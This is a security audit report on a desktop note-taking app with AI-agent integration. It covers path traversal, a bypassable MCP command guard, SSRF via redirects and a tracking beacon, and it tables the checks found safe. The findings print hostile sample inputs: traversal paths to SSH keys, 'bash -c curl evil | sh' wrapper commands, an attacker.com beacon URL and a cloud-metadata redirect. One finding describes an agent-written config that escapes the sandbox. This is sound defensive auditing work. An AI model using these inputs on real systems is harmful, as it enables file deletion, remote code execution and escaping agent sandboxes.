## Findings

### HIGH: `agent_uninstall` path traversal → arbitrary file deletion
**File:** `src-tauri/src/commands/agent_manager.rs:1524`

`agent_uninstall(agent_id: String)` builds its delete target as `agents_bin_dir().join(&agent_id)` and calls `std::fs::remove_file` with no validation of `agent_id`. Unlike `agent_install`/`do_agent_install`, which reject any id not matching the fixed `npm_agent_config`/`github_binary_agent_config` registry ("Unknown agent"), the uninstall path performs no such check. Because `PathBuf::join` with an absolute component replaces the base, and `..` components are not stripped, a caller can escape the managed bin dir:

- `agent_uninstall("../../../.ssh/id_rsa")` → `~/.notesage/agents/bin/../../../.ssh/id_rsa` = `~/.ssh/id_rsa`
- `agent_uninstall("/absolute/victim/path")` → deletes that absolute path

The command is registered in the IPC surface (`src-tauri/src/lib.rs`), so any compromised renderer, XSS sink, or malicious dependency in the WebView can delete any file the user can write (SSH keys, notes, sibling projects). Not gated by the agent Seatbelt profile (that constrains subprocesses, not IPC commands). Note this command was wired to a UI in deep-review batch 5 — the wiring is fine; the backend validation gap predates it.

**Fix:** Validate `agent_id` before use — reject unless `npm_agent_config(&agent_id).is_some() || github_binary_agent_config(&agent_id).is_some()` (mirror the `agent_install` dispatch), or at minimum reject any id containing `/`, `\`, `..`, or a leading `/` (the same guard `store.rs::state_file_path` already uses). Prefer the registry allowlist since agent ids are a closed set.

### MEDIUM: `validate_mcp_command` inline-code guard is bypassable via wrapper binaries
**File:** `src-tauri/src/commands/mcp/validation.rs:36`

`validate_mcp_command` is the *sole content gate* protecting the unsandboxed MCP stdio spawn (`mcp/mod.rs` uses a plain `tokio::process::Command::new(&config.command)` with no Seatbelt wrapper — confirmed, and documented as intentional in `mcp/config.rs:31`). The guard only matches when the **basename of `command`** is in `INLINE_CODE_INTERPRETERS` AND an arg is an inline-eval flag. It never inspects `args` for a nested interpreter, so a wrapper binary defeats it while achieving the exact arbitrary-exec the guard's docstring claims to block:

- `command: "env", args: ["bash", "-c", "curl evil | sh"]`
- `command: "/usr/bin/xargs", args: ["-I", "{}", "bash", "-c", "…"]`
- `command: "nohup"/"timeout"/"setsid"/"stdbuf"/"nice", args: ["bash", "-c", "…"]`
- `awk`/`gawk` (not in the list) with a `BEGIN{system("…")}` program

Exploitation requires an agent to write `~/.notesage/mcp.json` (an always-writable dir) AND the user to enable that server — all discovered servers correctly default to `enabled: false` (`mcp/config.rs:49`, verified). The disabled-by-default gate is a meaningful mitigation (hence MEDIUM, not HIGH), but the guard as written gives false assurance that the canonical exploit is closed.

**Fix:** Also scan `args` for an interpreter basename paired with an inline-eval flag, and add the common exec-wrapper basenames (`env`, `xargs`, `nohup`, `timeout`, `setsid`, `stdbuf`, `nice`, `script`, `busybox`, `awk`, `gawk`) to the denylist — or, better, gate this defense-in-depth check behind actually sandboxing MCP stdio servers under the same Seatbelt wrapper as ACP agents (the real fix for parity; already a documented follow-up in `architecture.md`).

### MEDIUM: `mcp_oauth` metadata/token fetches follow redirects without per-hop SSRF re-validation
**File:** `src-tauri/src/commands/mcp_oauth.rs:334` (`oauth_http_client`), consumed by `fetch_json` / `discover_metadata`

`validate_external_url` correctly requires `https`, rejects `localhost`/`*.localhost`, and runs IP literals through the shared `net_guard::is_blocked_ip`. But `oauth_http_client()` builds a `reqwest::Client` with the **default redirect policy** (follows up to 10 hops). The discovery documents (`oauth-protected-resource`, `oauth-authorization-server`) and endpoints are attacker-controllable, and a validated `https://public-host/...` metadata URL can 30x-redirect to `http://169.254.169.254/…` or an RFC-1918 address — the redirect target is never re-validated. This is distinct from the documented DNS-rebinding caveat. `link_preview.rs` handles this correctly (`redirect::Policy::none()` + `validate_public_url` per hop); `mcp_oauth` does not. Blast radius is bounded: these fetches only run during an explicit user-initiated OAuth sign-in.

**Fix:** Build the OAuth client with `redirect::Policy::none()` and follow redirects manually, calling `validate_external_url` on each `Location` (the exact pattern already in `link_preview::fetch_link_metadata`).

### LOW: Link-preview metadata is auto-fetched (zero-click) to an attacker-chosen public host
**File:** `src/components/editor/LinkPreviewCard.tsx:36-63`

When a link-preview node has a `url` but no `title`, `initialState` is `"loading"` and the effect calls `fetchLinkMetadata(url)` on render with no user click. If agent-authored markdown serializes into a `linkPreview` node, rendering the document triggers an outbound request from the user's IP to an attacker-controlled URL (`http://attacker.com/track?id=…`) — a tracking/IP-leak beacon, even though the *backend* fetch is SSRF-hardened (public hosts only, capped body, per-redirect validation — all verified). The higher-risk *image* beacon is already correctly gated behind the opt-in `linkPreviewRemoteImages` setting (default off) with `referrerPolicy="no-referrer"`; only the one metadata request is un-gated.

**Fix:** Consider gating the auto metadata fetch behind the same privacy setting, or only auto-fetch for user-typed embeds (the `/embed` input path) and require an explicit action for nodes originating from imported/agent content.

### LOW: `process:default` grants the renderer JS-driven `exit`/`restart` (DoS surface)
**File:** `src-tauri/capabilities/default.json:14`

`process:default` includes `process:allow-exit` and `process:allow-restart`, letting any JS in the WebView terminate/restart the app — a self-DoS primitive with no legitimate renderer need beyond the updater flow. Low impact (availability only, local).

**Fix:** Replace `process:default` with only the specific process permissions actually invoked, dropping `allow-exit`/`allow-restart` if unused. Add a lock to `tauri-capability-surface.test.ts` so it can't silently return.

### LOW: `net_guard` IPv6 blocklist omits a few reserved ranges
**File:** `src-tauri/src/commands/net_guard.rs:32-42`

The IPv6 branch blocks loopback, unspecified, ULA (`fc00::/7`), and link-local (`fe80::/10`), and unwraps v4-mapped addresses — solid coverage of the exploitable internal ranges. Not covered: IPv6 documentation `2001:db8::/32` and NAT64 `64:ff9b::/96`. Not routable-to-internal-services in practice; hardening only.

**Fix:** Add `2001:db8::/32` and (optionally) `64:ff9b::/96` to the match for completeness.

## Confirmed Good Patterns

Re-audit of everything hardened since 2026-06-09; all checked adversarially and found correct.

| Check | Status | Notes |
| --- | --- | --- |
| **network_proxy request parser** (rewrite) | Safe | Growable head read bounded at 64 KiB (`MAX_REQUEST_HEAD_BYTES`), returns `TooLarge` → 431. Headers parsed from head slice only; body/pipelined bytes never scanned for a forged `Host:`. `find_head_end` has no index panic. |
| **Proxy allowlist/upstream consistency (M3)** | Safe | For absolute-form targets, host derives from the request-target and the *same* value is used for both allowlist check and upstream connect; a disagreeing `Host:` header is rejected. No divergence. |
| **Proxy request smuggling / pipelining** | Safe | Pipelined second request stays on the TCP tunnel to the already-validated upstream host. Userinfo/`@` tricks resolve to non-allowlisted hosts and are denied. |
| **CONNECT leftover-bytes path** | Safe | Bytes read past the CONNECT head are forwarded to the validated upstream after `200 Established`, not dropped and not mis-parsed. |
| **agent_manager download caps** | Safe | `download_capped` clamps prealloc, rejects oversized Content-Length, enforces running-total cap. Zip/tar per-file caps via `Read::take(cap+1)`; Node runtime cumulative cap. |
| **agent_manager integrity + TOCTOU** | Safe | Node tarball verified against `SHASUMS256.txt` before extraction; URLs hardcoded. Tar-slip guard rejects `..`/root/prefix components; permission bits masked to `0o755` (setuid/setgid stripped). `GITHUB_BINARY_CHECKSUM_ASSET = None` means Goose archives are recorded-but-not-verified — accepted, tracked in issue #534. |
| **process_guard PID identity** | Safe | Deny-by-default: no `ps` output → no kill; only an argv containing the recorded needle signals. SIGTERM → bounded wait → SIGKILL. Recommend always passing the resolved binary path as the needle (substring needles could over-match). |
| **dialog.rs `run_in_terminal`** | Safe | Command bound as `item 1 of argv` after `--`; zero escaping layers, no interpolation into the AppleScript source. Injection eliminated. |
| **net_guard shared blocklist + both consumers** | Safe | Single `is_blocked_ip` superset (loopback, RFC-1918, link-local incl. `169.254.169.254`, CGNAT, broadcast, unspecified, 0.0.0.0/8, documentation, v4-mapped-v6, ULA, v6 link-local). Both `link_preview.rs` and `mcp_oauth.rs` route through it — the prior drift is closed. |
| **link_preview SSRF** | Safe | Scheme enforced, `Policy::none()` + per-redirect `validate_public_url`, rejects if *any* resolved address is blocked, 2 MiB body cap, content-type gate. DNS-rebinding residual documented LOW. |
| **store_read_batch / store path handling** | Safe | All store commands route through `state_file_path`, which rejects `/`, `\`, and `..`. Batch variant inherits the guard. |
| **network_proxy_status / copilot_lsp_sign_out / mcp_list_tools cache** | Safe | Status exposes only counts/addrs; sign-out takes no user input, leaks no credential; cache-first tools list returns metadata only. |
| **useEditorImageDrop** | Safe | Dropped OS files are MIME-filtered and routed through `compressImage` into a `data:` URI. File paths never touch `convertFileSrc`/asset scope; non-decodable files fail closed with a toast. |
| **MCP config enable-by-default (config-guards)** | Safe | `map_config_entries` forces `enabled: false` for *every* source regardless of the file's `disabled` flag; user must explicitly toggle. Closes the auto-enable → unsandboxed-spawn chain. |
| **ACP vs MCP sandbox parity** | Verified (asymmetric by design) | ACP agents spawn under `sandbox-exec` with `(deny default)` (tests assert it). MCP stdio servers spawn unsandboxed — documented, disabled-by-default-mitigated limitation (see MEDIUM finding). |
| **acp/ + mcp/ directory-module refactors** | Safe (spot-check) | `validate_mcp_command` still called on the stdio path in the split module; ACP spawn still consults `should_sandbox_by_default` and the Seatbelt wrapper. No permission/sandbox gate dropped in the moves. |
| **Allow-Always domain persistence scoping** | Safe | `domainAlwaysAllowed` keyed strictly `connectionId → bucket(projectRoot \| 'global')`; reads only consult the connection's own buckets — no cross-connection leakage. Backend mirrors the decision into the live session list and defers persistence to the store. |
| **SQL injection** | Safe | `index/queries.rs` dynamic WHERE builds only `?N` placeholders via `format!`; every user value bound through `rusqlite` `ToSql` params. No value interpolation. |
| **XSS** | Safe | comrak configured without `unsafe_` (raw HTML escaped). Mermaid `securityLevel: "strict"`. `HtmlViewer`, `external-diff`, `ai-suggestion` all DOMPurify-wrap; HtmlViewer unsafe mode is explicit opt-in with a warning. `chart.tsx` sinks are CSS-ident/color sanitized. |
| **Credential handling** | Safe | `resolve_api_key` consults the keychain FIRST and only falls back to the IPC param when the keychain has nothing — a passed key can never shadow the keychain. Keys used only as headers, not logged. MCP OAuth tokens keychain-stored. |
| **Tauri capability / CSP surface** | Safe (improved) | Strict CSP (`script-src 'self' 'wasm-unsafe-eval'`, `object-src 'none'`, `base-uri 'self'`, `frame-ancestors 'none'`). assetProtocol scope excludes `$HOME`; user roots granted at runtime via guarded `allow_asset_dir`. No `fs:allow-*`; `http:default` narrowly scoped. |
| **Capability-surface regression test** | Safe (fixed) | Now explicitly rejects `$HOME/**` *and* any `$HOME`-rooted entry, asserts the strict CSP directives, locks the dropped `fs:*` and narrow `http:`/clipboard/aptabase grants. The old "no literal `**`" false-assurance gap is closed. |
